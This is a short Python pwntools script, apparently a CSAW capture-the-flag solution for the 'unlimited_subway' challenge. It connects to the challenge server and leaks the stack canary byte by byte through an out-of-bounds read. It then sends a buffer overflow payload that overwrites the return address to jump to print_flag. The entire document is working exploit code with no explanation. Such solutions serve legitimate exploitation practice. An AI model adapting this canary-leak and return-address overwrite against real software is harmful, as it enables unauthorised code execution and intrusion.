from pwn import *
r = remote('pwn.csaw.io', 7900)
e = ELF('./unlimited_subway')

# leak canary
canary = b''
for i in range(4):
    r.sendline(b'V')
    r.sendline(str(0x84 - 0x4 + i).encode())
    r.recvuntil(b'> ')
    byte = bytes.fromhex(r.recvline()[-3:-1].decode().strip())
    canary += byte 
print(f'canary = {canary.hex()}')

payload = b'a' * (0x44-4) + canary + b'a' * 4 + p32(e.sym['print_flag'])
r.sendline(b'E')
r.sendline(str(len(payload)).encode())
r.sendline(payload)

r.interactive()

